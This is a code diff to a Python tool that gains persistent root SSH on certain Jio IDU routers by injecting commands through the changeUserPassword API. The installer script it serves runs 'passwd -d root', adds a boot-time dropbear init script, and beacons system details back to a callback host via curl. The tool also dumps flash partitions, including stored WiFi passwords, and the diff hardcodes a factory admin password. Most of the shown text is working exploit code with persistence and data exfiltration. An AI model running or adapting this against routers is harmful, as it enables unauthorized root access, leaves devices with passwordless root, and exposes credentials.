@@ -67,6 +67,14 @@ STAGING_PATH = "/a"
 
 FACTORY_PASSWORD = "Jiocentrum"
 
+# Set by --verbose in main(): adds the per-command detail behind each step.
+VERBOSE = False
+
+# Whether to print the model/vendor banner. The drivers identify the device once
+# (their describe step) and then run several engine commands against it, so they
+# pass --no-banner afterwards rather than repeat the same two lines each time.
+BANNER = True
+
 MEDIATEK = {"JIDU6101", "JIDU6201", "JIDU6401", "JIDU6601", "JIDU6701"}
 QUALCOMM = {"JIDU6111", "JIDU6411", "JIDU6611", "JIDU6811", "JIDU6911"}
 
@@ -458,15 +466,17 @@ class Shell:
 # --------------------------------------------------------------------------- #
 # unlock: injection -> root ssh
 # --------------------------------------------------------------------------- #
-def installer_script(address: str, pubkey: str) -> str:
-    """The script the router downloads: installs the key and keeps dropbear alive.
+def installer_script(address: str, pubkey: str | None = None) -> str:
+    """The script the router downloads: root access, and keeps dropbear alive.
+
+    With no key the router is left with passwordless root and no key installed,
+    so nothing of ours stays on it — the same choice the driver's --key makes.
 
     The vendor's /etc/init.d/dropbear force-disables SSH on every boot of a
     Release build, and this firmware has no /etc/init.d/rc.local, so persistence
     needs an init script of our own ordered after theirs.
     """
-    return f"""#!/bin/sh
-CB={shlex.quote(address)}
+    key_block = "" if not pubkey else f"""\
 KEY={shlex.quote(pubkey.strip())}
 mkdir -p /root/.ssh /etc/dropbear
 for f in /root/.ssh/authorized_keys /etc/dropbear/authorized_keys; do
@@ -476,7 +486,11 @@ for f in /root/.ssh/authorized_keys /etc/dropbear/authorized_keys; do
 done
 chmod 700 /root/.ssh
 
-cat > /etc/init.d/idu-ssh <<'INIT'
+"""
+    return f"""#!/bin/sh
+CB={shlex.quote(address)}
+passwd -d root
+{key_block}cat > /etc/init.d/idu-ssh <<'INIT'
 #!/bin/sh /etc/rc.common
 START=99
 STOP=01
@@ -491,7 +505,7 @@ ln -sf ../init.d/idu-ssh /etc/rc.d/K01idu-ssh
 dropbear -R -p 0.0.0.0:22 >/dev/null 2>&1
 {{
     echo "id: $(id)"
-    echo "key: $(wc -l < /root/.ssh/authorized_keys) line(s)"
+    echo "key: $(wc -l < /root/.ssh/authorized_keys 2>/dev/null || echo 0) line(s)"
     echo "persist: $(ls /etc/rc.d/ | tr '\\n' ' ')"
     echo "sshd: $(netstat -lnt 2>/dev/null | grep -c ':22')"
 }} | curl -s -X POST --data-binary @- http://$CB/beacon 2>&1
@@ -564,7 +578,7 @@ def _release(version: str) -> tuple | None:
 
 
 def _supported_release(release: tuple) -> bool:
-    cutoff = (3, 0, 3)
+    cutoff = (3, 2, 0)
     return (release[:len(cutoff)] < cutoff
             or (release[:len(cutoff)] == cutoff
                 and not any(release[len(cutoff):])))
@@ -589,49 +603,79 @@ def check(api: Api) -> Verdict:
         test_required = True
     elif _supported_release(release):
         vectors.append(PasswordVector.name)
-        evidence.append("release <= R3.0.3: changeUserPassword is injectable")
+        evidence.append("release <= R3.2.0: changeUserPassword is injectable")
         test_required = False
     else:
         vectors.append(PasswordVector.name)
-        evidence.append("release > R3.0.3: test the API with unlock")
+        evidence.append("release > R3.2.0: test the API with unlock")
         test_required = True
 
     return Verdict(model=model, firmware=version, vectors=vectors,
                    evidence=evidence, test_required=test_required)
 
 
-def unlock(api: Api, key_path: str, password: str, port: int = 80,
-           patience: int = 900) -> None:
-    """Exploit the API to install our key and gain root SSH.
+def _shell_for(key: str | None, host: str) -> Shell:
+    """The key if one was given, otherwise the passwordless root session.
+
+    With no key installed, `passwd -d root` means sshd accepts an empty password,
+    so this still works — but only where `expect` is available (macOS/Linux). On
+    Windows, pass --key to automate this.
+    """
+    if key:
+        if not os.path.exists(key):
+            raise IduError(f"no SSH key at {key} — create one, or drop --key")
+        return Shell(host, key=key)
+    return Shell(host, password="")
+
+
+def _ssh_hint(key: str | None, host: str) -> str:
+    if key:
+        return f"ssh -i {key} -o IdentitiesOnly=yes root@{host}"
+    return f"ssh root@{host}   (no password, just press Enter)"
+
+
+def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
+           patience: int = 900, hint: bool = True) -> None:
+    """Exploit the API to gain root SSH.
 
     The firmware version is informational; the result of this API exploit is
-    authoritative.
+    authoritative. Nothing is generated here: with no --key the router is left
+    with passwordless root and nothing of ours installed on it.
     """
-    pub_path = key_path + ".pub"
-    if not os.path.exists(pub_path):
-        raise IduError(f"no public key at {pub_path} — generate one first")
-    with open(pub_path) as handle:
-        pubkey = handle.read().strip()
+    pubkey = None
+    if key_path:
+        pub_path = key_path + ".pub"
+        if not os.path.exists(pub_path):
+            raise IduError(
+                f"no public key at {pub_path}\n"
+                "    Create one (ssh-keygen -t rsa -b 2048 -f PATH), or drop --key\n"
+                "    to leave root passwordless instead.")
+        with open(pub_path) as handle:
+            pubkey = handle.read().strip()
 
-    shell = Shell(api.host, key=key_path)
+    shell = _shell_for(key_path, api.host)
     if shell.alive():
-        print("[+] SSH already works")
+        print("[+] Root SSH enabled")
+        if hint:
+            print(f"    {_ssh_hint(key_path, api.host)}")
         return
 
     address = address_reaching(api.host)
     script = installer_script(address, pubkey)
     vectors: list[Vector] = [PasswordVector()]
+    total = len(vectors)
 
+    print("[*] Unlocking...")
     with Callback(script, port=port) as beacon:
-        for vector in vectors:
-            print(f"[*] trying {vector.name}")
+        for number, vector in enumerate(vectors, start=1):
             seen = len(beacon.hits)
             try:
-                with api.session("admin", password, patience) as device:
-                    print(f"    {device.model} ({device.vendor}, {device.board})")
+                with api.session("admin", password, patience):
                     vector.execute(api, address)
             except IduError as problem:
-                print(f"[!] {vector.name}: {problem}")
+                print(f"    Method {number}/{total}: failed")
+                if VERBOSE:
+                    print(f"      {problem}")
                 continue
 
             try:
@@ -641,19 +685,25 @@ def unlock(api: Api, key_path: str, password: str, port: int = 80,
                     raise IduError(
                         "the installer ran but sshd never came up. Last beacon:\n"
                         f"    {beacon.hits[-1].replace(chr(10), chr(10) + '    ')}")
-                print(f"[!] {vector.name} never executed (router did not call back)")
+                print(f"    Method {number}/{total}: failed (the router never "
+                      f"called back)")
                 continue
 
+            print(f"    Method {number}/{total}: success")
+            print("[+] Root SSH enabled")
+            if hint:
+                print(f"    {_ssh_hint(key_path, api.host)}")
             if len(beacon.hits) > seen:
-                print("[+] beacon:")
+                print("[*] Router reported:")
                 print("    " + beacon.hits[-1].replace("\n", "\n    "))
+            print("[+] SSH persistence enabled")
             return
 
     raise IduError(
-        f"{PasswordVector.name} did not land:\n"
-        "    The API exploit did not succeed. The firmware may have hardened the\n"
-        "    password handler or the API may be locked down. The u-boot/UART console\n"
-        "    is then the remaining route.")
+        "the changeUserPassword method did not land:\n"
+        "    The API exploit did not succeed — the password handler may be\n"
+        "    hardened, or the API locked down. The u-boot/UART console is then\n"
+        "    the remaining route.")
 
 
 # --------------------------------------------------------------------------- #
@@ -748,8 +798,24 @@ def _parse_telpa_record(blob: bytes) -> dict:
 def parse_mfg_blob(blob: bytes) -> dict:
     """Parse an MFG partition image in any of the layouts this family ships.
 
+    Last resort for anything unreadable: some units (a 6101 on R3.2.3, for one)
+    keep nothing structured in this partition, but the model string survives
+    elsewhere in the flash as plain text — 8-bit or wide. Better to name the unit
+    than to say nothing at all.
+    """
+    data = _parse_mfg_blob(blob)
+    if not data.get("device_model"):
+        model = _scan_for_model(blob)
+        if model:
+            data["device_model"] = model
+    return data
+
+
+def _parse_mfg_blob(blob: bytes) -> dict:
+    """Parse an MFG partition image in any of the layouts this family ships.
+
     Unmapped slots are kept as `mfg_slot_N` so nothing is silently dropped —
-    the Sercomm table has no field names, so guessing beyond the obvious ones
+    the vendor table has no field names, so guessing beyond the obvious ones
     would be worse than labelling them by position.
     """
     data: dict = {}
@@ -761,14 +827,36 @@ def parse_mfg_blob(blob: bytes) -> dict:
     if "WiFi-SSID" in data or "device_model" in data:
         return {k: v for k, v in data.items() if v}
 
-    if blob[:8] != b"mfg.data":
+    # The same table also arrives byte-widened: every byte stored as a UTF-16
+    # code unit behind a BOM. That is an artefact of how a dump was exported,
+    # not something the device writes, but it is the only form some dumps come
+    # in — and read as 8-bit it yields nothing, because every character is
+    # followed by a NUL. Offsets double in that form, so scale them.
+    if blob.startswith(b"\xff\xfe"):
+        wide, base = True, 2
+    elif blob.startswith(b"mfg.data"):
+        wide, base = False, 0
+    else:
         return _parse_telpa_record(blob)
 
-    count = int.from_bytes(blob[8:12], "little")
+    scale = 2 if wide else 1
+    magic = "mfg.data".encode("utf-16-le") if wide else b"mfg.data"
+    if blob[base:base + len(magic)] != magic:
+        return _parse_telpa_record(blob)
+
+    count = int.from_bytes(blob[base + 8 * scale:base + 8 * scale + 4], "little")
+    table = base + MFG_TABLE_OFFSET * scale
+    stride = MFG_SLOT_BYTES * scale
+
     slots = []
     for index in range(min(count, MFG_MAX_SLOTS)):
-        start = MFG_TABLE_OFFSET + index * MFG_SLOT_BYTES
-        raw = blob[start:start + MFG_SLOT_BYTES].split(b"\x00", 1)[0]
+        raw = blob[table + index * stride:table + (index + 1) * stride]
+        if wide:
+            value = raw.decode("utf-16-le", "ignore").split("\x00", 1)[0]
+            value = value.replace("\uffff", "").strip()
+            slots.append(value)          # erased flash reads as U+FFFF, handled above
+            continue
+        raw = raw.split(b"\x00", 1)[0]
         if not raw or not raw.strip(b"\xff"):        # empty or erased flash
             slots.append("")
             continue
@@ -798,6 +886,32 @@ def parse_mfg_blob(blob: bytes) -> dict:
             data["WiFi-Password"] = key
             data.pop(f"mfg_slot_{ssid_index + 1}", None)
     return data
+
+
+def _scan_for_model(blob: bytes) -> str | None:
+    """The `JIDU####` model string, in whichever encoding it was written.
+
+    Two bytes patterns rather than two encodings of one pattern: in the wide form
+    the digits are wide too, so the pattern has to be written out in bytes —
+    encoding a regex string would interleave its metacharacters with NULs.
+    """
+    match = re.search(rb"JIDU\d{4}", blob)
+    if match:
+        return match.group().decode("ascii")
+    match = re.search(rb"J\x00I\x00D\x00U\x00(?:\d\x00){4}", blob)
+    if match:
+        return match.group().decode("utf-16-le")
+    return None
+
+
+def human_size(count: int) -> str:
+    """Bytes as something a person reads at a glance."""
+    size = float(count)
+    for unit in ("B", "KB", "MB", "GB"):
+        if size < 1024 or unit == "GB":
+            return f"{size:.0f} {unit}" if unit == "B" else f"{size:.1f} {unit}"
+        size /= 1024
+    return f"{size:.1f} GB"
 
 
 def read_model_and_serial(shell: Shell) -> tuple:
@@ -871,38 +985,24 @@ def backup(shell: Shell, outdir: str, include_full_chip: bool = False) -> str:
         print("[!] MFG layout: positional table, not KEY=VALUE — "
               f"named what could be identified, kept {len(slots)} slot(s) as-is")
 
-    print(f"[+] {len(parts)} partitions; writing to {root}")
+    print(f"[*] Backing up {len(parts)} partitions...")
     for part in parts:
         if part.device == "mtd0" and not include_full_chip:
-            print(f"    - {part.device} ({part.name}) skipped, pass --full-chip to include")
+            print(f"    {part.name} skipped (pass --full-chip to include)")
             continue
         target = os.path.join(images, part.filename)
-        print(f"    - {part.device} {part.name} ({part.size} bytes)")
+        print(f"    {part.name:<14} {human_size(part.size)}")
         if part.device == mfg.device:
             os.replace(staged, target)          # already fetched, just file it
             continue
         shell.fetch(f"/dev/{part.device}", target)
-    print(f"[+] backup complete: {root}")
+    print(f"[+] Backup saved: {root}")
     return root
 
 
 # --------------------------------------------------------------------------- #
 # command line
 # --------------------------------------------------------------------------- #
-def _default_key() -> str:
-    return os.path.expanduser("~/.ssh/idu_rsa")
-
-
-def _ensure_key(path: str) -> str:
-    if os.path.exists(path):
-        return path
-    require_tool("ssh-keygen")
-    print(f"[*] generating an RSA key at {path}")
-    subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-N", "", "-C", "idu",
-                    "-f", path], check=True, stdout=subprocess.DEVNULL)
-    return path
-
-
 def main(argv: list | None = None) -> int:
     parser = argparse.ArgumentParser(
         prog="idu",
@@ -910,9 +1010,19 @@ def main(argv: list | None = None) -> int:
     parser.add_argument("--router", default="https://192.168.31.1")
     parser.add_argument("--password", default=FACTORY_PASSWORD,
                         help=f"router admin password (default {FACTORY_PASSWORD})")
-    parser.add_argument("--key", default=_default_key(), help="RSA key for SSH")
+    parser.add_argument("--key", default=None,
+                        help="RSA key for SSH. Optional: with no key the tool "
+                             "leaves root passwordless and installs nothing.")
     parser.add_argument("--patience", type=int, default=900,
                         help="seconds to wait for a free admin session")
+    # SUPPRESS, not False: an absent flag must not clobber the same option given
+    # before the subcommand.
+    parser.add_argument("--verbose", "-v", action="store_true",
+                        default=argparse.SUPPRESS,
+                        help="show the per-command detail behind each method")
+    parser.add_argument("--no-banner", action="store_true",
+                        default=argparse.SUPPRESS,
+                        help="skip the model/vendor banner (the drivers print it once)")
     subs = parser.add_subparsers(dest="command", required=True)
     subs.add_parser("detect", help="identify the model, change nothing")
 
@@ -921,21 +1031,31 @@ def main(argv: list | None = None) -> int:
 
     unlock_p = subs.add_parser("unlock", help="gain root SSH and keep it")
     unlock_p.add_argument("--port", type=int, default=80, help="callback HTTP port")
+    unlock_p.add_argument("--verbose", "-v", action="store_true",
+                          default=argparse.SUPPRESS, help=argparse.SUPPRESS)
+    unlock_p.add_argument("--no-banner", action="store_true",
+                          default=argparse.SUPPRESS, help=argparse.SUPPRESS)
 
     backup_p = subs.add_parser("backup", help="credentials + partition images")
     backup_p.add_argument("--outdir", default=".")
+    backup_p.add_argument("--no-banner", action="store_true",
+                          default=argparse.SUPPRESS, help=argparse.SUPPRESS)
     backup_p.add_argument("--full-chip", action="store_true",
                           help="also image mtd0 (the whole SPI chip)")
 
     args = parser.parse_args(argv)
+    global VERBOSE, BANNER
+    VERBOSE = bool(getattr(args, "verbose", False))
+    BANNER = not getattr(args, "no_banner", False)
     api = Api(args.router)
 
     # One session at a time: the backend permits a single admin login, so this
     # identifies the device and then releases the session before anything that
     # opens one of its own.
     with api.session("admin", args.password, args.patience) as device:
-        print(f"[+] {device.model} · {device.vendor} · board {device.board}")
-        print(f"[+] family: {device.family}")
+        if BANNER:
+            print(f"[+] Device: {device.model} ({device.vendor} / {device.board})")
+            print(f"[+] Family: {device.family}")
         model, family = device.model, device.family
         if args.command == "detect":
             print(f"MODEL={model}")
@@ -961,13 +1081,12 @@ def main(argv: list | None = None) -> int:
             return 0 if verdict.test_required or verdict.unlockable else 2
 
     if args.command == "unlock":
-        unlock(api, _ensure_key(args.key), args.password, port=args.port,
+        unlock(api, args.key, args.password, port=args.port,
                patience=args.patience)
-        print(f"[+] try: ssh -i {args.key} -o IdentitiesOnly=yes root@{api.host}")
         return 0
 
     if args.command == "backup":
-        backup(Shell(api.host, key=_ensure_key(args.key)), args.outdir, args.full_chip)
+        backup(_shell_for(args.key, api.host), args.outdir, args.full_chip)
         return 0
 
     return 0
@@ -979,5 +1098,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         raise SystemExit(130)
     except IduError as problem:
-        sys.stderr.write(f"[!] {problem}\n")
+        sys.stderr.write(f"[-] {problem}\n")
         raise SystemExit(1)
